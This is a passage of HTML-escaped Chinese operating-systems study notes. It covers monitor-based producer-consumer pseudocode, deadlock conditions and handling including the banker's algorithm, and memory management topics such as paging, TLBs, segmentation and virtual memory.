function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Item &lt;span class=&#34;token function&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; N&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;full&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remove_item&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    end monitor&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;producer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        item &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; 生产一个产品&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        producerconsumer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;consumer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        item &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; producerconsumer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        消费产品 item&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011121314151617181920212223242526272829303132333435&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;拓展 2：Java 中类似于管程的机制&lt;/p&gt;
&lt;p&gt;java 中用 synchronized 来描述一个函数，这个函数同一时间只能被一个线程调用&lt;/p&gt;
&lt;h3 id=&#34;24_1-死锁的概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_1-死锁的概念&#34;&gt;#&lt;/a&gt; 2.4_1 死锁的概念&lt;/h3&gt;
&lt;p&gt;1、什么是死锁&lt;/p&gt;
&lt;p&gt;各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;2、进程死锁、饥饿、死循环的区别&lt;/p&gt;
&lt;p&gt;死锁：&lt;/p&gt;
&lt;p&gt;定义：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;区别：至少两个或两个的进程同时发生死锁&lt;/p&gt;
&lt;p&gt;饥饿：&lt;/p&gt;
&lt;p&gt;定义：由于长期得不到想要的资源，某进程无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;区别：可能只有一个进程发生饥饿&lt;/p&gt;
&lt;p&gt;死循环：&lt;/p&gt;
&lt;p&gt;定义：某进程执行过程中一直跳不出某个循环的现象。&lt;/p&gt;
&lt;p&gt;区别：死循环是程序员的问题&lt;/p&gt;
&lt;p&gt;3、死锁产生的必要条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;互斥条件：多个进程争夺资源发生死锁&lt;/li&gt;
&lt;li&gt;不剥夺条件：进程获得的资源不能由其它进程强行抢夺&lt;/li&gt;
&lt;li&gt;请求和保持条件：某个进程有了资源，还在请求资源&lt;/li&gt;
&lt;li&gt;循环等待条件：存在资源的循环等待链&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4、什么时候会发生死锁&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对系统资源的竞争&lt;/li&gt;
&lt;li&gt;进程推进顺序非法&lt;/li&gt;
&lt;li&gt;信号量的使用不当也会造成死锁&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5、死锁的处理策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;预防死锁&lt;/li&gt;
&lt;li&gt;避免死锁&lt;/li&gt;
&lt;li&gt;死锁的检测和解除&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;24_2-死锁的处理策略预防死锁&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_2-死锁的处理策略预防死锁&#34;&gt;#&lt;/a&gt; 2.4_2 死锁的处理策略 —— 预防死锁&lt;/h3&gt;
&lt;p&gt;1、不允许死锁发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态策略：预防死锁
&lt;ul&gt;
&lt;li&gt;破坏互斥条件（有些不能破坏）&lt;br&gt;
把互斥的资源改造为共享资源&lt;/li&gt;
&lt;li&gt;破坏不剥夺条件（复杂，造成之前工作失效，降低系统开销，会全部放弃、导致饥饿）&lt;br&gt;
方案 1：当请求得不到满足的时候，立即释放手里的资源&lt;br&gt;
方案 2：由系统介入，强行帮助剥夺&lt;/li&gt;
&lt;li&gt;破坏请求和保持条件（资源利用率极低，可能会导致某些进程饥饿）&lt;br&gt;
采用静态分配方法，一次性全部申请，如果申请不到，不要允许&lt;/li&gt;
&lt;li&gt;破坏循环等待条件（不方便增加新的设备，实际使用与递增顺序不一致，会导致资源的浪费，必须按规定次序申请资源）&lt;br&gt;
顺序资源分配法：对资源编号，进程按编号递增顺序请求资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;动态检测：避免死锁&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、允许死锁发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;死锁的检测和解除&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;24_3-死锁的处理策略避免死锁&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_3-死锁的处理策略避免死锁&#34;&gt;#&lt;/a&gt; 2.4_3 死锁的处理策略 —— 避免死锁&lt;/h3&gt;
&lt;p&gt;动态检测：避免死锁&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;什么是安全序列&lt;/p&gt;
&lt;p&gt;进行后面的某些情况，不会使系统发生死锁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;什么是系统的不安全状态，与死锁有何联系&lt;br&gt;
如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁（处于不安全状态未必就是发生了死锁，但发生死锁时一定时在不安全状态）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如何避免系统进入不安全状态 —— 银行家算法&lt;/p&gt;
&lt;p&gt;初始分配完成后，优先全部分配给最少的，并且拿回资源&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;1、检查此次申请是否超过了之前声明的最大需求数&lt;/p&gt;
&lt;p&gt;2、检查此时系统剩余的可用资源是否还能满足这次请求&lt;/p&gt;
&lt;p&gt;3、试探着分配，更改各数据结构&lt;/p&gt;
&lt;p&gt;4、用安全性算法检查此次所分配是否会导致系统进入不安全状态&lt;/p&gt;
&lt;h3 id=&#34;24_4-死锁的处理策略检测和解除&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_4-死锁的处理策略检测和解除&#34;&gt;#&lt;/a&gt; 2.4_4 死锁的处理策略 —— 检测和解除&lt;/h3&gt;
&lt;p&gt;死锁的检测&lt;/p&gt;
&lt;p&gt;1、用某种数据结构来保存资源的请求和分配信息&lt;/p&gt;
&lt;p&gt;2、提供一种算法，利用上述信息来检测系统是否已进入死锁状态&lt;/p&gt;
&lt;p&gt;死锁的解除&lt;/p&gt;
&lt;p&gt;1、资源剥夺法：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。&lt;/p&gt;
&lt;p&gt;2、撤销进程法：强制撤销部分，甚至全部死锁进程，并剥夺这些进程的资源。&lt;/p&gt;
&lt;p&gt;3、进程回退法：让一个或多个死锁进程回退到足以避免死锁的地步。&lt;/p&gt;
&lt;h3 id=&#34;31_1-内存的基础知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_1-内存的基础知识&#34;&gt;#&lt;/a&gt; 3.1_1 内存的基础知识&lt;/h3&gt;
&lt;p&gt;1、什么是内存&lt;/p&gt;
&lt;p&gt;存储单元：每个地址对应一个存储单元&lt;/p&gt;
&lt;p&gt;内存地址：&lt;/p&gt;
&lt;p&gt;2、进程运行的基本原理&lt;/p&gt;
&lt;p&gt;指令的工作原理：&lt;/p&gt;
&lt;p&gt;逻辑地址 vs 物理地址：逻辑地址就是相对地址&lt;/p&gt;
&lt;p&gt;从写程序到程序运行：编辑 - 编译 - 链接 - 装入&lt;/p&gt;
&lt;p&gt;三种链接方式：静态链接（在程序运行前，先将各目标模块及它们所需的库函数连接成一个完整的可执行文件）、装入时动态链接（将各目标模块装入内存时，边装入边链接的链接方式）、运行时动态链接（在程序执行中需要该模块时，才对它进行链接，其优点时便于修改和更新。）&lt;/p&gt;
&lt;p&gt;三种装入方式：绝对装入（在编译的时候就知道程序放在内存的哪个位置）、静态重定位（装入时将逻辑地址转表为物理地址）、动态重定位（把地址转化推迟到程序真正要执行时才进行）&lt;/p&gt;
&lt;h3 id=&#34;31_2-内存管理的概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_2-内存管理的概念&#34;&gt;#&lt;/a&gt; 3.1_2 内存管理的概念&lt;/h3&gt;
&lt;p&gt;1、内存空间的分配与回收&lt;/p&gt;
&lt;p&gt;2、内存空间的扩充&lt;/p&gt;
&lt;p&gt;内存的虚拟性&lt;/p&gt;
&lt;p&gt;3、地址转换&lt;/p&gt;
&lt;p&gt;逻辑地址和物理地址转换&lt;/p&gt;
&lt;p&gt;4、存储保护&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置上下限寄存器&lt;/li&gt;
&lt;li&gt;采用重定位寄存器（基址寄存器）和界地址寄存器（限长寄存器）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;31_3-覆盖与交换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_3-覆盖与交换&#34;&gt;#&lt;/a&gt; 3.1_3 覆盖与交换&lt;/h3&gt;
&lt;p&gt;内存空间的扩充&lt;/p&gt;
&lt;p&gt;覆盖技术：将程序分为多个段，内存分为” 固定区 “和” 覆盖区 “，需要常驻的放在” 固定区 “，调入后就不再调出，不常用的段放在” 覆盖区 “，需要用到时调入内存，用不到时掉出内存&lt;/p&gt;
&lt;p&gt;交换技术：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存（PCB 会常驻内存，不会被患处）&lt;/p&gt;
&lt;p&gt;虚拟存储技术：&lt;/p&gt;
&lt;h3 id=&#34;31_4-连续分配管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_4-连续分配管理方式&#34;&gt;#&lt;/a&gt; 3.1_4 连续分配管理方式&lt;/h3&gt;
&lt;p&gt;连续分配方式&lt;/p&gt;
&lt;p&gt;单一连续分配：内存被分配为系统区和用户区，系统区在低地址，用户区是一个用户独享&lt;/p&gt;
&lt;p&gt;固定分区分配：将用户区分割为若干固定分区给各道程序，分割策略有分区大小相等和分区大小不相等，可以建议一个分区说明表来管理各个分区&lt;/p&gt;
&lt;p&gt;动态分区分配：可变分区分配，不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要。&lt;/p&gt;
&lt;p&gt;内部碎片：分配给某进程的内存区域中，如果有些部分没有用上&lt;/p&gt;
&lt;p&gt;外部碎片：是指内存中的某些空闲分区由于太小而难以利用（如果有外部碎片，可以采用紧凑技术）&lt;/p&gt;
&lt;h3 id=&#34;31_5-动态分区分配算法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_5-动态分区分配算法&#34;&gt;#&lt;/a&gt; 3.1_5 动态分区分配算法&lt;/h3&gt;
&lt;p&gt;1、首次适应算法（First Fit)&lt;/p&gt;
&lt;p&gt;算法思想：每次从低地址开始查找，找到第一个能满足大小的空闲分区&lt;/p&gt;
&lt;p&gt;2、最佳适应算法 (Best Fit)&lt;/p&gt;
&lt;p&gt;算法思想：为了保证 “大进程” 到来时能有连续的大片区域，可以尽可能留下大片的空闲区，优先使用更小的空闲区。&lt;/p&gt;
&lt;p&gt;空闲分区按容量递增次序链接，分配内存时顺序查找空闲分区链&lt;/p&gt;
&lt;p&gt;缺点：会留下小碎片&lt;/p&gt;
&lt;p&gt;3、最坏适应算法 (Worst Fit)&lt;/p&gt;
&lt;p&gt;算法思想：和最佳适应算法相反，按容量递减次序排列，每次尽可能用大的分区&lt;/p&gt;
&lt;p&gt;4、领近适应算法 (Next Fit)&lt;/p&gt;
&lt;p&gt;算法思想：每次从上次查找结束的位置开始检索&lt;/p&gt;
&lt;p&gt;缺点：大空间容易被用完&lt;/p&gt;
&lt;h3 id=&#34;31_6-基本分页存储管理的基本概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_6-基本分页存储管理的基本概念&#34;&gt;#&lt;/a&gt; 3.1_6 基本分页存储管理的基本概念&lt;/h3&gt;
&lt;p&gt;允许一个进程分散地装入道许多不相邻的位置&lt;/p&gt;
&lt;p&gt;连续分配：为用户进程分配连续的内存空间&lt;/p&gt;
&lt;p&gt;非连续分配：为用户进程分配分散的内存空间&lt;/p&gt;
&lt;p&gt;将内存分为大小相等的小分区 “页框”，将用户的进程空间也分为大小相等的一个个区域，以页框的基本单位分配给每个进程片&lt;/p&gt;
&lt;p&gt;分页管理：物理地址 = 页面的其实位置 + 偏移量&lt;/p&gt;
&lt;p&gt;计算机中用 2 的整数倍表示页面的大小&lt;/p&gt;
&lt;p&gt;页表：存放页号和块号的对应关系&lt;/p&gt;
&lt;h3 id=&#34;31_7-基本地址变换机构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_7-基本地址变换机构&#34;&gt;#&lt;/a&gt; 3.1_7 基本地址变换机构&lt;/h3&gt;
&lt;p&gt;页表寄存器（PTR），存放页表在内存中的起始地址 F 和页表长度 M，进程未执行时，页表的起始地址和页表的长度放在进程控制块（PCB）中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。&lt;/p&gt;
&lt;h3 id=&#34;31_8-具有快表的地址变换机构&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_8-具有快表的地址变换机构&#34;&gt;#&lt;/a&gt; 3.1_8 具有快表的地址变换机构&lt;/h3&gt;
&lt;p&gt;1、局部性原理&lt;/p&gt;
&lt;p&gt;时间局部性：访问某个变量后，在不久的将来还会被访问&lt;/p&gt;
&lt;p&gt;空间局部性：程序访问了某个存储单元，不久之后，其附近的存储单元也很有可能被访问&lt;/p&gt;
&lt;p&gt;2、什么是快表（TLB）&lt;/p&gt;
&lt;p&gt;快表：又称联想寄存器（TLB），是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。&lt;/p&gt;
&lt;p&gt;3、引入快表后，地址的变换过程&lt;/p&gt;
&lt;h3 id=&#34;31_9-两级页表&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_9-两级页表&#34;&gt;#&lt;/a&gt; 3.1_9 两级页表&lt;/h3&gt;
&lt;p&gt;1、单级页表存在什么问题？如何解决？&lt;/p&gt;
&lt;p&gt;所有页表项必须连续存放，页表过大时需要很大的连续空间&lt;/p&gt;
&lt;p&gt;在一段时间内并非所有页面都用得到，因此没必要让整个页表常驻内存&lt;/p&gt;
&lt;p&gt;2、两级页表的原理、逻辑地址结构&lt;/p&gt;
&lt;p&gt;将长长的页表再分页&lt;/p&gt;
&lt;p&gt;逻辑地址结构：（一级页号、二级页号、页内偏移量）&lt;/p&gt;
&lt;p&gt;页目录表、外层页表、顶级页表&lt;/p&gt;
&lt;p&gt;3、如何实现地址变换？&lt;/p&gt;
&lt;p&gt;按照地址结构将逻辑地址拆分成三部分&lt;/p&gt;
&lt;p&gt;从 PCB 中读出页目录表始址，根据一级页号查页目录表，找到下一级页表在内存中的存放位置&lt;/p&gt;
&lt;p&gt;根据二级页号查表，找到最终想访问的内存块号&lt;/p&gt;
&lt;p&gt;结合页内偏移量得到物理地址&lt;/p&gt;
&lt;p&gt;4、两级页表问题需要注意的几个细节&lt;/p&gt;
&lt;p&gt;多级页表中，各级页表的大小不能超过一个页面。若两级页表不够，可以分更多级&lt;/p&gt;
&lt;p&gt;多级页表的访问次数（假设没有快表结构）——N 级页表访问一个逻辑地址需要 N+1 次访存&lt;/p&gt;
&lt;h3 id=&#34;31_10-基本分段存储管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_10-基本分段存储管理方式&#34;&gt;#&lt;/a&gt; 3.1_10 基本分段存储管理方式&lt;/h3&gt;
&lt;p&gt;1、什么是分段？&lt;/p&gt;
&lt;p&gt;进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每段有段名，每段从 0 开始编址&lt;/p&gt;
&lt;p&gt;段号的位数决定了每个进程最多可以分几个段&lt;/p&gt;
&lt;p&gt;段内地址位数决定了每个段的最大长度是多少&lt;/p&gt;
&lt;p&gt;2、什么是段表&lt;/p&gt;
&lt;p&gt;段表：段映射表&lt;/p&gt;
&lt;p&gt;每个程序被分段后，用段表记录该程序在内存中存放的位置&lt;/p&gt;
&lt;p&gt;段表：段号 段长 基址&lt;/p&gt;
&lt;p&gt;3、如何实现地址变换&lt;/p&gt;
&lt;p&gt;4、分段、分页管理的对比&lt;/p&gt;
&lt;p&gt;页：信息的物理单位，实现离散分配，提高内存利用率，地址是一维的，访存两次&lt;/p&gt;
&lt;p&gt;段：信息的逻辑单位，对系统可见，地址是二维的，访存 3 次&lt;/p&gt;
&lt;p&gt;分段比分页更容易实现信息的共享和保护（不能被修改的代码称为纯代码和可重入代码，不属于临界资源）&lt;/p&gt;
&lt;h3 id=&#34;31_11-段页式的管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_11-段页式的管理方式&#34;&gt;#&lt;/a&gt; 3.1_11 段页式的管理方式&lt;/h3&gt;
&lt;p&gt;1、分页、分段管理方式最大的优缺点&lt;/p&gt;
&lt;p&gt;分页：利用率高，碎片少，不方便进行信息共享和保护&lt;/p&gt;
&lt;p&gt;分段：方便信息共享和保护，如果段长大，容易产生外部碎片&lt;/p&gt;
&lt;p&gt;2、分段 + 分页的结合 —— 段页式管理方式&lt;/p&gt;
&lt;p&gt;先分段再分页&lt;/p&gt;
&lt;p&gt;段号 + 页号 + 页内偏移量&lt;/p&gt;
&lt;p&gt;地址结构是二维的&lt;/p&gt;
&lt;p&gt;3、段表、页表&lt;/p&gt;
&lt;p&gt;4、如何实现地址变换&lt;/p&gt;
&lt;h3 id=&#34;32_1-虚拟内存的基本概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_1-虚拟内存的基本概念&#34;&gt;#&lt;/a&gt; 3.2_1 虚拟内存的基本概念&lt;/h3&gt;
&lt;p&gt;1、传统存储管理方式的特征、缺点&lt;/p&gt;
&lt;p&gt;之前讲的&lt;/p&gt;
&lt;p&gt;一次性：作业必须全部装入内存后才能开始运行，并发性下降&lt;/p&gt;
&lt;p&gt;驻留性：一旦作业被装入内存，就会一直驻留在内存&lt;/p&gt;
&lt;p&gt;2、局部性原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间局部性&lt;/li&gt;
&lt;li&gt;空间局部性&lt;/li&gt;
&lt;li&gt;高速缓存技术&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3、虚拟内存的定义和特征&lt;/p&gt;
&lt;p&gt;虚拟内存最大容量是计算机地址结构确定的&lt;/p&gt;
&lt;p&gt;虚拟内存的实际容量 = min (内存和外存容量之和，CPU 寻址范围)&lt;/p&gt;
&lt;p&gt;eg：某计算机地址结构为 32 位，按字节编址，内存大小为 512MB，外存大小为 2DB.&lt;/p&gt;
&lt;p&gt;则虚拟内存的最大容量为 2^32B=4GB&lt;/p&gt;
&lt;p&gt;虚拟内存的实际容量 = min (2^32B,512MB+2GB)=2GB+512MB&lt;/p&gt;
&lt;p&gt;多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调用内存&lt;/p&gt;
&lt;p&gt;对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入换出&lt;/p&gt;
&lt;p&gt;虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量&lt;/p&gt;
&lt;p&gt;4、如何实现虚拟内存技术&lt;/p&gt;
&lt;p&gt;在程序执行过程中，当所访问的信息不再内存时，由操作系统负责将所需信息从外存调入内存，然后继续执行程序。&lt;/p&gt;
&lt;p&gt;若内存空间不够，由操作系统负责将内存中暂时用不到的信息换出到外存。&lt;/p&gt;
&lt;h3 id=&#34;32_2-请求分页管理方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32_2-请求分页管理方式&#34;&gt;#&lt;/a&gt; 3.2_2 请求分页管理方式&lt;/h3&gt;
